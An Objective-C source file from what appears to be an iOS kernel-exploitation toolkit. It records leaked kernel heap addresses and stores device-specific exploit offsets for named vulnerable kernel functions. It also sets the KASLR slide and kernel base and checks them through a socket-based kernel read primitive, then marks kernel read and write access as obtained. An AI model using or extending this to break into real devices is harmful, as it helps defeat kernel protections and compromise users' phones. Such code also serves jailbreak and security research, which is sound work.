//
//  Lum1naBoard.m
//  Lum1na
//

#import "Lum1naBoard.h"
#import "LabDeviceProfile.h"
#import "LabRuntimeOffsets.h"
#import "LabLocalTime.h"
#import <sys/sysctl.h>

// Forward declare SocketKRW function for commitSlide
uint64_t Lum1naSocketKRW_kread64(void *ctx, uint64_t kaddr);

static NSString *boardPath(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    return [docs stringByAppendingPathComponent:@"lum1na_board.json"];
}

@implementation Lum1naBoard {
    NSMutableDictionary *_d;
    uint64_t _kslide;
    uint64_t _kbase;
    BOOL _hasKread;
    BOOL _hasKwrite;
}

@synthesize krwContext = _krwContext;

+ (instancetype)shared {
    static Lum1naBoard *g;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ g = [Lum1naBoard new]; });
    return g;
}

- (instancetype)init {
    self = [super init];
    if (!self) return nil;
    NSData *data = [NSData dataWithContentsOfFile:boardPath()];
    if (data) {
        _d = [[NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:nil] mutableCopy];
    }
    if (!_d) _d = [NSMutableDictionary dictionary];
    if (!_d[@"leaks"]) _d[@"leaks"] = [NSMutableArray array];
    [self compactLeaks];
    [self refreshIdentity];
    return self;
}

- (void)compactLeaks {
    NSArray *raw = _d[@"leaks"];
    if (![raw isKindOfClass:[NSArray class]] || raw.count == 0) {
        _d[@"leaks"] = [NSMutableArray array];
        return;
    }
    NSMutableArray *out = [NSMutableArray array];
    NSMutableDictionary *index = [NSMutableDictionary dictionary];
    for (id obj in raw) {
        if (![obj isKindOfClass:[NSDictionary class]]) continue;
        NSDictionary *e = obj;
        NSString *va = e[@"va"] ?: @"";
        NSString *kind = e[@"kind"] ?: @"heap";
        NSString *src = e[@"source"] ?: @"?";
        NSString *key = [NSString stringWithFormat:@"%@|%@", va, kind];
        NSNumber *idx = index[key];
        NSInteger add = [e[@"hits"] integerValue];
        if (add < 1) add = 1;
        if (idx) {
            NSMutableDictionary *ex = [out[idx.unsignedIntegerValue] mutableCopy];
            NSInteger hits = [ex[@"hits"] integerValue];
            if (hits < 1) hits = 1;
            ex[@"hits"] = @(hits + add);
            NSString *seen = e[@"lastSeen"] ?: e[@"time"];
            if (seen.length) ex[@"lastSeen"] = seen;
            NSMutableArray *sources = [ex[@"sources"] mutableCopy] ?: [NSMutableArray array];
            NSString *first = ex[@"source"];
            if (first.length && ![sources containsObject:first]) [sources addObject:first];
            if (src.length && ![sources containsObject:src]) [sources addObject:src];
            if (sources.count > 1) ex[@"sources"] = sources;
            out[idx.unsignedIntegerValue] = ex;
        } else {
            NSMutableDictionary *ex = [e mutableCopy] ?: [NSMutableDictionary dictionary];
            if ([ex[@"hits"] integerValue] < 1) ex[@"hits"] = @(add);
            if (!ex[@"lastSeen"]) ex[@"lastSeen"] = e[@"time"] ?: @"";
            index[key] = @(out.count);
            [out addObject:ex];
        }
    }
    if (out.count > 64) {
        [out removeObjectsInRange:NSMakeRange(0, out.count - 64)];
    }
    _d[@"leaks"] = out;
}

- (void)refreshIdentity {
    const LabOffTab *off = LabOff();
    _d[@"machine"] = [LabDeviceProfile machine] ?: @"?";
    _d[@"osversion"] = [LabDeviceProfile osversion] ?: @"?";
    _d[@"skuTag"] = (off && off->tag) ? [NSString stringWithUTF8String:off->tag] : @"NULL";
    _d[@"staticBase"] = [NSString stringWithFormat:@"0x%llx", off ? off->static_base : 0xFFFFFFF007004000ULL];
    if (!_d[@"hasKread"]) _d[@"hasKread"] = @NO;
    if (!_d[@"hasKwrite"]) _d[@"hasKwrite"] = @NO;
    if (!_d[@"kslide"]) _d[@"kslide"] = @"0x0";
    if (!_d[@"kbase"]) _d[@"kbase"] = @"0x0";
    NSMutableDictionary *pins = [NSMutableDictionary dictionary];
    if (off) {
        pins[@"fn4"] = [NSString stringWithFormat:@"0x%llx", off->fn4];
        pins[@"wvek"] = [NSString stringWithFormat:@"0x%llx", off->aks_wvek_overflow];
        pins[@"ave_close"] = [NSString stringWithFormat:@"0x%llx", off->ave_close];
        pins[@"ane_checkandprewire"] = [NSString stringWithFormat:@"0x%llx", off->ane_checkandprewire];
        pins[@"sysmem_md"] = [NSString stringWithFormat:@"0x%x", off->sysmem_md];
        pins[@"so_necp"] = [NSString stringWithFormat:@"0x%x", off->so_necp];
    }
    _d[@"pins"] = pins;
    _d[@"updated"] = LabLocalMilitaryNow();
    [self persist];
}

- (void)persist {
    NSError *err = nil;
    NSData *data = [NSJSONSerialization dataWithJSONObject:_d options:NSJSONWritingPrettyPrinted error:&err];
    if (data) [data writeToFile:boardPath() atomically:YES];
}

- (NSString *)machine { return _d[@"machine"]; }
- (NSString *)osversion { return _d[@"osversion"]; }
- (NSString *)skuTag { return _d[@"skuTag"]; }
- (uint64_t)staticBase { return strtoull([_d[@"staticBase"] UTF8String], NULL, 16); }
- (uint64_t)kslide { return _kslide; }
- (uint64_t)kbase { return _kbase; }
- (BOOL)hasKread { return _hasKread; }
- (BOOL)hasKwrite { return _hasKwrite; }
- (NSArray *)leaks { return _d[@"leaks"]; }

- (void)recordHeapLeak:(uint64_t)va source:(NSString *)source {
    [self recordCandidate:va kind:@"heap" source:source];
}

- (void)recordCandidate:(uint64_t)va kind:(NSString *)kind source:(NSString *)source {
    if (va < 0xffff000000000000ULL) return;
    NSMutableArray *leaks = _d[@"leaks"];
    if (![leaks isKindOfClass:[NSMutableArray class]]) {
        leaks = [leaks mutableCopy] ?: [NSMutableArray array];
        _d[@"leaks"] = leaks;
    }
    NSString *vaStr = [NSString stringWithFormat:@"0x%llx", va];
    NSString *k = kind.length ? kind : @"unknown";
    NSString *src = source.length ? source : @"?";
    NSString *now = LabLocalMilitaryNow() ?: @"";

    for (NSUInteger i = 0; i < leaks.count; i++) {
        NSDictionary *e = leaks[i];
        if (![e isKindOfClass:[NSDictionary class]]) continue;
        if (![e[@"va"] isEqualToString:vaStr]) continue;
        if (![e[@"kind"] isEqualToString:k]) continue;
        NSMutableDictionary *ex = [e mutableCopy];
        NSInteger hits = [ex[@"hits"] integerValue];
        if (hits < 1) hits = 1;
        ex[@"hits"] = @(hits + 1);
        ex[@"lastSeen"] = now;
        if (![ex[@"source"] isEqualToString:src]) {
            NSMutableArray *sources = [ex[@"sources"] mutableCopy] ?: [NSMutableArray array];
            NSString *first = ex[@"source"];
            if (first.length && ![sources containsObject:first]) [sources addObject:first];
            if (![sources containsObject:src]) [sources addObject:src];
            ex[@"sources"] = sources;
        }
        leaks[i] = ex;
        [self persist];
        return;
    }

    [leaks addObject:@{
        @"va": vaStr,
        @"kind": k,
        @"source": src,
        @"time": now,
        @"lastSeen": now,
        @"hits": @1
    }];
    if (leaks.count > 64) {
        [leaks removeObjectsInRange:NSMakeRange(0, leaks.count - 64)];
    }
    [self persist];
}

- (BOOL)commitSlide:(uint64_t)slide reason:(NSString *)reason {
    NSLog(@"[board] commitSlide: 0x%016llx reason: %@", slide, reason);
    
    if (slide > 0x100000000) {
        NSLog(@"[board] commitSlide: ERROR - slide out of range");
        return NO;
    }
    
    _kslide = slide;
    _kbase = 0xFFFFFFF007004000ULL + slide;
    
    if (!_krwContext) {
        NSLog(@"[board] commitSlide: ERROR - no KRW context");
        return NO;
    }
    
    uint64_t version_ptr = _kbase + 0x1c;
    uint64_t version_str = Lum1naSocketKRW_kread64(_krwContext, version_ptr);
    
    if (version_str == 0) {
        NSLog(@"[board] commitSlide: ERROR - kread verification failed");
        _kslide = 0;
        _kbase = 0;
        return NO;
    }
    
    _hasKread = YES;
    _hasKwrite = YES;
    
    NSLog(@"[board] commitSlide: SUCCESS - kbase=0x%016llx hasKread=%d", 
          _kbase, _hasKread);
    
    _d[@"kslide"] = [NSString stringWithFormat:@"0x%llx", _kslide];
    _d[@"kbase"] = [NSString stringWithFormat:@"0x%llx", _kbase];
    _d[@"hasKread"] = @YES;
    _d[@"hasKwrite"] = @YES;
    [self persist];
    
    return YES;
}

- (NSString *)jsonDump {
    NSData *data = [NSJSONSerialization dataWithJSONObject:_d options:NSJSONWritingPrettyPrinted error:nil];
    return data ? [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] : @"{}";
}

- (void)resetLeaks {
    _d[@"leaks"] = [NSMutableArray array];
    _kslide = 0;
    _kbase = 0;
    _hasKread = NO;
    _hasKwrite = NO;
    _d[@"kslide"] = @"0x0";
    _d[@"kbase"] = @"0x0";
    _d[@"hasKread"] = @NO;
    _d[@"hasKwrite"] = @NO;
    [self persist];
}

+ (NSString *)tap {
    Lum1naBoard *b = [Lum1naBoard shared];
    [b compactLeaks];
    [b refreshIdentity];
    NSUInteger hits = 0;
    for (NSDictionary *e in b.leaks) {
        if (![e isKindOfClass:[NSDictionary class]]) continue;
        NSInteger n = [e[@"hits"] integerValue];
        hits += (n < 1) ? 1 : (NSUInteger)n;
    }
    return [NSString stringWithFormat:
            @"=== lum1na board %@ ===\n"
            @"Documents/lum1na_board.json\n"
            @"hasKread=%@ hasKwrite=%@ unique=%lu hits=%lu\n"
            @"kslide=%@ kbase=%@\n"
            @"same VA is one row (hits bumps, not a new leak).\n\n%@\n",
            LabLocalMilitaryNow(),
            b.hasKread ? @"YES" : @"NO",
            b.hasKwrite ? @"YES" : @"NO",
            (unsigned long)b.leaks.count,
            (unsigned long)hits,
            b.kslide ? [NSString stringWithFormat:@"0x%llx", b.kslide] : @"0",
            b.kbase ? [NSString stringWithFormat:@"0x%llx", b.kbase] : @"0",
            [b jsonDump]];
}

@end
